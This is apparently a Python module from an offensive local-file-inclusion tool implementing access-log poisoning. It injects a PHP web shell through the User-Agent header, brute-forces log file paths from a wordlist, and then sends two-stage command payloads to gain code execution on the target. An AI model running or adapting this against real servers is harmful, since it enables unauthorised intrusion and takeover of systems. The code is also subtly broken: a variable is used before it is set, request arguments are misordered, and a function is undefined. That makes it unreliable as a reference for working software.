from src.utils.arguments import args
from src.httpreqs import request
from src.configs import config
from src.utils.args_check import scriptDirectory
import os
from src.utils import colors
from src.configs import config

def exploit_log_poison(ip, port, url, payloadStageOne, payloadStageTwo, testPayload, testString, post):
    if(args.f):
        return

    if(args.verbose):
        print(colors.green("[.]")  + " Trying to locate http access log file...")

    maliciousHeaders = args.httpheaders.copy()
    maliciousHeaders['User-Agent'] = "<?php system($_GET['c']); ?>"
    
    if(not os.path.exists(scriptDirectory + os.sep + "src/wordlists/http_access_log.txt")):
        print(colors.red("[-]") + " Cannot locate '" + scriptDirectory + os.sep + "src/wordlists/http_access_log.txt" + "' file that contains log locations")
        return

    with open(scriptDirectory + os.sep + "src/wordlists/http_access_log.txt", "r") as f:
        lines = f.readlines()
        for line in lines:
            line = line.replace("\n", "")
            u = url.replace(config.tempArg, line)
            if(args.postreq): 
                res, _ = request.REQUEST(url, args.httpheaders, post.replace(config.tempArg, line), config.proxies, "", "", exploit = True)
            else: 
                res, _ = request.REQUEST(u, args.httpheaders, "", config.proxies, "", "", exploit = True)

            if(args.httpheaders['User-Agent'] in res.text):
                #Upload web shell inside log
                res, _ = request.REQUEST(u, maliciousHeaders, config.proxies, "", "", exploit = True)

                if("?" in exploitUrl): exploitUrl = u + "&c=" + testPayload
                else: exploitUrl = u + "?c=" + testPayload

                res, _ = request.REQUEST(exploitUrl, args.httpheaders, config.proxies, "", "", exploit = True)
                if(testString in res.text):
                    printInfo(ip, port, "bash", "access log posioning")
                      
                    if(args.postreq):
                        #Stage 1
                        exploitPost = post + "&c=" + payloadStageOne
                        request.REQUEST(url, args.httpheaders, exploitPost, config.proxies, "", "", exploit = True)

                        if(payloadStageTwo != ""):
                            #Stage 2
                            request.REQUEST(url, exploitPost, args.httpheaders, config.proxies, "", "", exploit = True)
                            exploitPost = u + "&c=" + payloadStageTwo
                        return True
                    
                    else:
                        #Stage 1
                        exploitUrl = u+ "&c=" + payloadStageOne
                        request.REQUEST(exploitUrl, args.httpheaders, config.proxies, "", "", exploit = True)
                        
                        if(payloadStageTwo != ""):
                            #Stage 2
                            exploitUrl = u+ "&c=" + payloadStageTwo
                            request.REQUEST(exploitUrl, args.httpheaders, config.proxies, "", "", exploit = True)
                        return True